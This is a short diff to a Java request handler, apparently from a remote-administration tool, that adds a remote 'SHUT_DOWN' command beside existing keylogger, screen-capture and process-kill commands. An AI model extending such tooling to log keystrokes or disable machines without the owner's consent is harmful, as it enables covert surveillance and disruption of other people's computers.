@@ -5,6 +5,7 @@ import java.net.*;
 import Application.Server_GUI;
 import KeyLogger.KeyLogger;
 import ScreenCapture.ScreenCapture;
+import ShutDown.ShutDown;
 import process.ListProcess;
 import process.ProcessKill;
 import process.ProcessStart;
@@ -88,7 +89,10 @@ public class ActionThread extends Thread {
 			else if (request.equals("KEY_LOGGER_STOP")) {
 				KeyLogger keyLogger = new KeyLogger(oos, "");
 				keyLogger.send_KeyLogger();
-			} 
+			} else if(request.equals("SHUT_DOWN")) {
+				ShutDown shutDown = new ShutDown(oos);
+				shutDown.shutDown();
+			}
 
 			else if (request.equals("SCREEN_CAPTURE")) {
 				ScreenCapture screenCapture = new ScreenCapture(oos);
@@ -100,7 +104,7 @@ public class ActionThread extends Thread {
 					this.record += " - failed";
 				}
 				main.actionRecorded(fromIP, record);
-			}
+			} 
 
 			else {
 				throw new Exception();
